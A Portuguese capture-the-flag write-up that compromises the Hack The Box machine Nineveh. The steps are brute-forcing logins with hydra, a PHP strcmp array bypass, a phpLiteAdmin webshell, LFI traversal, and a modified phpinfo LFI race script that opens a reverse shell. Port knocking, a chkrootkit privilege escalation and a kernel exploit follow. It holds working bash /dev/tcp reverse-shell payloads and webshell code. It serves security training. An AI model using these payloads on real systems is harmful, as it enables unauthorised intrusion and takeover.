---
title: "Hack The Box - Nineveh"
tags: [Linux,Medium,Linux Exploit Suggester,Kernel,Pspy,Port Knocking,Linpeas,Linenum,Phpinfo LFI RCE,Brute Force,BurpSuite,Gobuster,Wfuzz]
categories: HackTheBox OSCP
---

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_inicial.png)

Link: <https://www.hackthebox.eu/home/machines/profile/54>

# Enumeração

## Primeiro passo é rodar o nmap contra a máquina, para verificar quais portas estão abertas e quais serviços estão sendo disponibilizados pelas portas.

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_nmap.png)

### Explicação de cada parâmetro do Nmap

> -sC --> Rodar alguns scripts padrão em cada porta

> -sV --> Levantar qual serviço está rodando na porta

> -Pn --> Já considera o host ativo

### Verificamos que temos 2 portas abertas no servidor

> Porta 80 e 443 - Servidores Web

## Enumeração da porta 80

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_web.png)

### Gobuster porta 80

Rodamos o Gobuster na porta 80 para procurar por diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_gobuster.png)

## Enumeração da porta 443

Abrimos o browser no endereço e encontramos a seguinte página web

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_web1.png)

### Gobuster na porta 443

Rodamos o Gobuster na porta 443 para procurar por diretórios

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_gobuster1.png)

### Vhost enumeração

Bom, sempre que encontramos um `vhost`, é uma boa prática realizarmos o Brute Force de vhosts, para verificar se tem mais subdominios na máquina

Primeiro passo é descobrir a base do endereço, isso conseguimos através do certificado da página 443

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_vhost.png)

> nineveh.htb

Agora usamos o `Wfuzz` para realizar essa enumeração

> wfuzz -c -u http://10.10.10.43/ -H "Host: FUZZ.nineveh.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt --hh 178

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_vhost1.png)

Bom, aqui não encontramos nada, mas fica a dica de como deve ser realizada essa enumeração. Eu usei uma wordlist pequena, apenas para demonstração

## /department (Porta 80)

Bom, vamos iniciar enumerando esse diretório /department que o Gobuster encontrou

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_dep.png)

Opa! Campo de login... vamos tentar um BruteForce nela?

### BruteForce Hydra (/department) - 1º Modo de explorar

Bom, sempre que verificamos um campo de login, é bom deixar um BruteForce rodando em background enquanto continuamos a enumeração

Primeiro passo é pegar como a requisição está sendo enviada, para isso usamos o `BurpSuite`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_hydra.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_hydra1.png)

> hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 http-post-form "/department/login.php:username=^USER^&password=^PASS^:Invalid" -t 64

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_hydra2.png)

Sintaxe Hydra

```
-l --> login
-P --> wordlist
http-post-form --> é uma requisição post
/department/login.php --> página de login
^USER^ --> campo user
^PASS^ --> campo senha
Invalid --> alguma mensagem que identifique que a requisição não foi um sucesso
-t 64 --> pra ir mais rápido, threads
```

Login encontrado

> admin:1q2w3e4r5t

Realizamos login na página com as credenciais encontradas

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_hydra3.png)

Bom aqui por hora não tem muito o que fazermos, a não ser o LFI óbvio que temos ali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_lfi.png)

Mas por agora vamos continuar a enumeração em outros pontos!

### /department - 2º Modo de explorar

Temos outra maneira de explorar o login desse /department

Antes de fazer o BruteForce poderíamos verificar como está sendo passado o password pra aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php.png)

Mandamos pro BurpSuite

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php1.png)

Mandamos pro Repeater

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php2.png)

Se mandarmos um array no password conseguimos acesso... `password[]`

Como?!?!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php4.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php5.png)

Hummm... vamos tentar explicar o que está acontecendo

PHP é muito bacana quando está trabalhando com comparação de diferentes tipos de data. O PHP faz uma comparação de string entre uma senha de um password e o que o usuário colocou, é mais ou menos isso que ele faz

strcmp --> passa onde as duas strings são diferentes, se der 0 é sinal que são iguais

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php6.png)

Se eu tentar passar um array para realizar a comparação ele da um erro, logicamente

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php7.png)

Mas o que é interessante observar é que mesmo dando erro, ele da a resposta como sendo 0, ou seja, vai dar acesso

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_php8.png)

Entendido? Vamos continuar

## /db (Porta 443)

Vamos verificar o que o gobuster encontrou na porta 443 no diretório /db

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_db.png)

Opa, `phpLiteAdmin v1.9`, e um campo de senha, bora quebrar ele também com o `hydra`

A ideia é a mesma, pegar um requisição web pelo BurpSuite pra ver como ela é

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N-db1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_db1.png)

> hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.10.43 https-post-form "/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:Incorrect" -t 64

Rodamos o hydra

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_db2.png)

Encontramos a senha: password123

Explicação parâmetros

```
-l --> login
-P --> wordlist
https-post-form --> é uma requisição post
/db/index.php --> página de login
^PASS^ --> campo senha
Incorrect--> alguma mensagem que identifique que a requisição não foi um sucesso
-t 64 --> pra ir mais rápido, threads
```

Logamos nele

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_db3.png)

# Exploração phpLiteAdmin v1.9 (Modo 1º de pegar shell)

Fazemos uma breve procura por exploits pra essa bagaça de aplicação

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_search.png)

O primeiro nos chamou muito atenção - Remote PHP Code Injection!

Então copiamos ele para nossa pasta de trabalho

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_search1.png)

Vamos realizar o que está descrito no exploit

> Crie uma database que termine com .php

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp1.png)

> Clique na nova db para alterar para ela, e então crie uma tabela com um 'field' modo texto com um PHP webshell basico

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp4.png)

> <?php echo system($_REQUEST["cmd"]); ?>

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp3.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp5.png)

É importante lembrar aqui que deve-se usar o `"` ao invés de `'`, pq a aspas simples o banco de dados vai interpretar e as aspas duplas não

Aqui está o arquivo que foi inserido, em `/var/tmp`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp6.png)

Tá, o payload está inserido, consigo ver onde ele foi adicionado e tudo mais, mas pô, como vou executar ele?

Hummmmmmmmm... lembra que temos um LFI escrachado na outra página? Será que não conseguimos executar por lá?

> Executar o payload

Quando acessos o /department nos somos direcionados para o manage.php

Clicando em Notes, vemos algo interessante

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_exp7.png)

```
Have you fixed the login page yet! hardcoded username and password is really bad idea!

check your serect folder to get in! figure it out! this is your challenge

Improve the db interface.
~amrois
```

Login page já conseguimos entrar, improve your db interface também, pelo phpLiteAdmin v1.9

Hummm, secret folder... agora que vamos ver o que ele quer dizer com isso

Tentamos vários diferentes tipos de LFI, até conseguir um que desse certo...

```
http://10.10.10.43/department/manage.php?notes=files/ninevehNotes.txt --> Essa página que está acima
http://10.10.10.43/department/manage.php?notes=/etc/passwd --> No note is selected
http://10.10.10.43/department/manage.php?notes=/../../../etc/passwd --> No note is selected
http://10.10.10.43/department/manage.php?notes=/ninevehNotes --> failed to open stream: No such file or directory in /var/www/html/department/manage.php
http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../etc/passwd --> Conteúdo do passwd
```

Pronto, conseguimos encontrar o ponto de LFI que da certo nessa máquina, como sabemos que o payload está em /var/tmp/nineveh.php, vamos executar!

> http://10.10.10.43/department/manage.php?notes=/ninevehNotes/../../var/tmp/nineveh.php&cmd=id

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_rev.png)

Temos RCE!

> Pegamos uma reverse shell

Ligamos o nc na nossa Kali e recebemos uma revserse shell do servidor

É importante rodar o & como URLEncode, pq senão a aplicação vai pensar que é um novo parâmetro

> bash -c 'bash -i >%26 /dev/tcp/10.10.16.119/443 0>%261'

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_shell.png)

# Exploração phpinfo (Modo 2º de pegar shell)

Antes de iniciar a escalação de privilégio, é interessante nós também explorarmos outra maneira de se conseguir shell na máquina, pois quanto mais a gente praticar, melhor ficamos

Agora a exploração será pelo phpinfo

Não sei se você se lembra, mas lá atrás tinha um phpinfo (info.php) na página http, então, ele parece extremamente inofensivo e nada de mais. Mase se olharmos mais a fundo podemos explorar ele

Vamos realizar o que está descrito por aqui. (Essa ideia eu peguei do blog do `0xdf`, reproduzi o que ele fez nessa máquina juntamente com o que foi feito na máquina Poison - HackTheBox)

> https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf

> PHP tem que estar configurado com `file_uploads = ON`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info.png)

Isso quer dizer que qualquer requisição PHP vai aceitar que seja upado arquivo, que serão salvos em uma localização temporária do servidor PHP até que a requisição seja completada. Mas pô, como vou saber onde vai ser guardada? O php info nos dá, fica tranquilo.

Vou demonstrar aqui pegando uma requisição para /info.php no BurpSuite e modificando para uma requisição POST com qualquer lixo

> Pegar um requisição para info.php, modificar para POST e acrescentar lixo nela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info1.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info2.png)

Mandamos pro Repetar

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info3.png)

Alteramos e enviamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info4.png)

Verificamos que foi "salva" no servidor

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info5.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info6.png)

Show! O arquivo está no servidor. Esse arquivo LIXO.txt só fica poucos segundos, mas eu posso ganhar a corrida e acessar ele antes de ele ir pro pau. O `Insomnia` colocou uma porrada de padding nos headers HTTP pra aumentar o tempo que o arquivo fica no servidor, dando tempo pro atacante acessar ele antes dele se deletar

> Vamos explorar!

O Insomnia também fez um script para poder explorar essa falha, ele está disponível para download aqui:

> https://www.insomniasec.com/downloads/publications/phpinfolfi.py

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info7.png)

Tive que realizar algumas alterações no código pra ele funcionar, por que nem tudo são flores...

As alterações foram:

Adicionei no topo do código as seguintes variáveis

```
local_ip = "10.10.16.119"
local_port = 443
phpsessid = "lp3drfpmomqfuvn9ss64ag0nm6"
```

Esse phpsessid precisa ser um válido, então tem que pegar bem antes de executar o script, pq ele muda rapidamente

Fiz algumas modificações na função setup

```
def setup(host, port):
    TAG="Security Test"
    PAYLOAD="""%s\r <?php system("bash -c 'bash -i >& /dev/tcp/%s/%d 0>&1'");?>\r""" % (TAG, local_ip, local_port)
    REQ1_DATA="""-----------------------------7dbff1ded0714\r
Content-Disposition: form-data; name="dummyname"; filename="test.txt"\r
Content-Type: text/plain\r
\r
%s
-----------------------------7dbff1ded0714--\r""" % PAYLOAD
    padding="A" * 5000
    REQ1="""POST /info.php?a="""+padding+""" HTTP/1.1\r
Cookie: PHPSESSID=""" + phpsessid + """; othercookie="""+padding+"""\r
HTTP_ACCEPT: """ + padding + """\r
HTTP_USER_AGENT: """+padding+"""\r
HTTP_ACCEPT_LANGUAGE: """+padding+"""\r
HTTP_PRAGMA: """+padding+"""\r
Content-Type: multipart/form-data; boundary=---------------------------7dbff1ded0714\r
Content-Length: %s\r
Host: %s\r
\r
%s""" %(len(REQ1_DATA),host,REQ1_DATA)
    #modify this to suit the LFI script   
    LFIREQ="""GET /department/manage.php?notes=/ninevehNotes/..%s HTTP/1.1\r
User-Agent: Mozilla/4.0\r
Proxy-Connection: Keep-Alive\r
Cookie: PHPSESSID=""" + phpsessid + """\r
Host: %s\r
\r
\r
"""
    return (REQ1, TAG, LFIREQ)
```

O que foi alterado?

1. O payload, agora vai me dar um reverse shell
2. Troquei o caminho do POST em REQ1 para /info.php o original tava /phpinfo.php
3. Troquei o caminho do LFIREQ para o da máquina Nineveh
4. Coloquei o PHPSESSION cookie no LFIREQ, de modo que agora ele pode acessar o LFI

Outra coisa que foi alterada, é como ele recebe a response da variável tmp_name, ele recebe com um "&gt;" no final, só que no script não tem isso. Possivelmente foi um erro de escrita de quem fez o script, mas corrigindo isso em dois pontos da certo 

Fazendo essas alterações conseguimos um shell na máquina

> python phpinfolfi.py 10.10.10.43 80 100

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_info8.png)

Aqui já poderiamos escalar para root... mas vamos fazer por partes e explicando do que se trata cada parte da máquina

# Escalação de privilégio para user

Agora vamos iniciar a escalação de privilégio dessa máquina

Bom, se lembrarmos lá antes de fazer o reverse shell, ele falava de um diretório secreto... então ele é o /var/www/ssl/secure_notes

Dentro dele descobrimos uma imagem

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_priv.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_priv1.png)

Também poderíamos ter descoberto ele no Gobuster (Aqui eu utilizei uma wordlist maior, antes usei uma que não tinha "secure_notes")

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_priv2.png)

Certo... tenho uma imagem, mas e ai?

Será que ela está a toa ai?! Creio que não, baixamos ela pra nossa máquina pra examinar ela melhor

## Binwalk

Bom, temos uma imagem, possivelmente tem algo escondido nela

Com o `binwalk` podemos verificar que tem algo estranho nela, algo compactado dentro dela

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_binwalk.png)

Então realizamos a extração

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_binwalk1.png)

Verificamos dentro dela uma chave ssh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_binwalk2.png)

## Strings

Também conseguimos ver essa chave SSH com o `strings`

> strings -n 18 nineveh.png

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_strings.png)

# Port Knocking

Pô, temos uma chave ssh, mas não tem nenhuma porta 22 aberta na máquina... como vamos entrar nela com essa chave ssh?

Se verificarmos, temos a porta aberta (22) em localhost, e sim, ele é SSH!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_port.png)

Quando isso acontece nos remetemos a uma situação particular chamada `Port Knocking`

Vamos verificar várias maneiras de se identificar o port knocking antes de prosseguir

## Ps aux - 1º Maneira

Outra coisa importante para verificarmos sempre é a questão do servidor `knockd` estar sendo executado nesse servidor... Esse serviço remete a configuração do firewall que dispõe sobre port knocking, podemos verificar ele com o seguinte comando

`
ps aux | grep knock
`

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_knock.png)

## Pspy - 2º Maneira

A 2º maneira a ser utilizada é o nosso amigo pspy

> https://github.com/DominicBreuker/pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_pspy.png)

Passamos ele para a máquina Nineveh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_pspy1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_pspy2.png)

Ai está ele...

## Agora vamos realizar o Port Knocking

Qual a ideia de port knocking? Ele é utilizado para que portas que não devem estar sempre abertas fiquem fechadas e só sejam abertas quando houver o "toque", "knock" em portas específicas. De bruto modo é isso, ta, show de bola... e quais são essas portas?

Uma wiki bacana, que explica do que se trata pode ser encontrada em:

> https://wiki.archlinux.org/index.php/Port_knocking

### 1º Maneira de verificar quais portas são - Arquivos de Configuração Knockd

A pasta onde está todos os "programas" que são iniciados com o start do sistema está em:

> /etc/init.d

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_conf2.png)

Verificamos esse `knockd` que não é normal do sistema

> /etc/default/knockd

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_conf1.png)

O arquivo que dita as configurações desse serviço knockd é o `/etc/knockd.conf`, intuitivo não?

Então vamos ver do que o arquivo se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_conf.png)

OpenSSH -> sequence = 571, 290, 911

Pronto, conseguimos o queriamos. Para acessar ao servidor SSH, devo dar um toque nessas três portas, e então o sistema vai abrir a porta SSH

### 2º Maneira de verificar quais portas são - Arquivos de mail

Outro modo de se descobrir quais são as portas é através de um email que o usuário tem

Os arquivos de mail ficam em /var/mail

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_mail.png)

Mas pô, fica dificil adivinhar isso, na verdade não, rodando o LinEnum.sh (/home/amrois/.bash_history) aparece ali o e-mail, coisa que eu nem ligava a maioria das vezes, mas vou começar a prestar mais atenção a partir de agora

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_mail1.png)

### 3º Modo de verificar quais portas são - Linpeas.sh

Outro modo de se verificar é rodar outro script de escalação de privilégio, o linpeas

> https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_linpeas.png)

Ai está!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_linpeas1.png)

## Agora sim, vamos realizar o Port Knocking

Bom, depois de muito papo, vamos pra ação...

Como vamos fazer esse tal de port knocking?

O comando para executar é:

`
for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done
`

1 -> Testamos pra ver se a porta 22 está aberta

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_ssh.png)

2 -> Executamos o Port Knocking

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_ssh1.png)

3 -> Testamos novamente a conexão ssh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_ssh2.png)

Aberta!

4 -> Conectamos via SSH

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_ssh3.png)

Show

# Escalação de Privilégio para root

Bom, agora com um shell de usuário, vamos iniciar a escalação de privilégio para root

## 1º Modo - Chkrootkit

Analizando os arquivos que posso acessar no `/` do sistema, encontramos uma pasta que nos chamou atenção por não ser padrão no sistema, a pasta /report

Verificamos do que se trata

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_rep.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_rep1.png)

Hummmm... interessante, são arquivos criados de tempo em tempo... será que não tem cronjobs rodando no sistema?

### Proc Mon Manual - 1º Maneira

A primeira maneira utilizada para verificar processos rodando no sistema é um proccess monitor manual, criado pelo `Ippsec`

```
#!/bin/bash

#Loop por linha
IFS=$'\n'

processos_antigos=$(ps -eo command)

while true; do
    novos_processos=$(ps -eo command)
    diff <(echo "$processos_antigos") <(echo "$novos_processos")
    sleep 1
    processos_antigos=$novos_processos
done
```

Rodamos ele na máquina e verificamos algo diferente... está sendo executado o chkrootkit

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_rep2.png)

### Pspy - 2º Maneira

A 2º maneira a ser utilizada é o nosso amigo pspy

> https://github.com/DominicBreuker/pspy

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_pspy.png)

Passamos ele para a máquina Nineveh

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_pspy1.png)

Executamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_pspy3.png)

Ai está ele!

## Pesquisando por exploits para Chkrootkit

O que é essa bagaça? Google sabe tudo!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_ch.png)

Vamos pesquisar por exploits então

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_searchs.png)

Lemos o que esse txt quer dizer

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_searchs1.png)

Resumindo... nós podemos produzir um reverse shell executável chamado update em /tmp. Supostamente ele vai ser executado como root, nos dando uma shell de root.

Vamos lá então

### Executando exploit para chkrootkit

[](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_reporte.png)

Recebemos a shell de root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_reporte1.png)

Poderíamos ter feito isso direto com o shell de www-data... Mas eu gosto sempre de realizar diferentes atividades...

## 2º Modo - Kernel

Já feito o primeiro modo de se escalar privilégio nessa máquina, vamos pro segundo

Com o comando `uname -a` verificamos a versão do kernel instalado

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_uname.png)

### Linux Exploit Suggester

Rodamos o Linux Exploit Suggester nessa máquina para verificar por exploits de Kernel

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_les.png)

> https://github.com/mzet-/linux-exploit-suggester

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_les1.png)

Baixamos pra Kali

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_les2.png)

Executamos no alvo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_les3.png)

Poooo, encontramos um monte... vamos iniciar pelo que já deu certo

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_les4.png)

#### eBPF_verifier

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_dccp.png)

> https://www.exploit-db.com/exploits/44298

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_dccp1.png)

Compilamos

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_dccp3.png)

Passamos pra máquina. Executamos e viramos root!

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_dccp2.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_dccp4.png)

Outros também dariam certo, é questão de teste... Faça você mesmo!

## Pegamos as flags de user e root

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_user.png)

![](https://raw.githubusercontent.com/0x4rt3mis/0x4rt3mis.github.io/master/img/htb-nineveh/N_root.png)